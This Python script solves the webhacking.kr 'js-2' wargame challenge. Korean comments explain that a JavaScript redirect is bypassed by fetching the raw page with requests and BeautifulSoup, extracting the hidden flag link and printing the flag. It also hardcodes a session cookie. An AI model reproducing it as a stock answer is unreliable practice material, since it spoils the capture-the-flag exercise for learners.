from bs4 import BeautifulSoup
import requests

URL = "https://webhacking.kr/challenge/js-2"
URI = "/"
PHPSESSID = 'jsm27523t35k3tpir7tgor97o2'

cookie = {'PHPSESSID' : PHPSESSID}

# 풀이
# 1. 일반 브라우저로 접근할 경우 JS 단에서 강제 리다이렉션되는데 브라우저에서 JS 실행 직전 ESC를 누르거나
#    크롤러를 만들어서 웹 프론트 소스 긁으면 FLAG 관련 정보 확인 가능

# 1. Flag 출력 페이지 링크 확인
resp = requests.post(URL + URI, cookies=cookie)

soup = BeautifulSoup(resp.content,"html.parser")
result = soup.find('script').contents[0]

s_idx_kw = '<a href='
e_idx_kw = '>[Get Flag]'

s_idx = result.find(s_idx_kw) + len(s_idx_kw)
e_idx = result.find(e_idx_kw)

ANS_URI = result[s_idx : e_idx]

# 2. Flag 획득
resp = requests.post(URL + URI + ANS_URI, cookies=cookie)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('script').contents[0]

print(FLAG)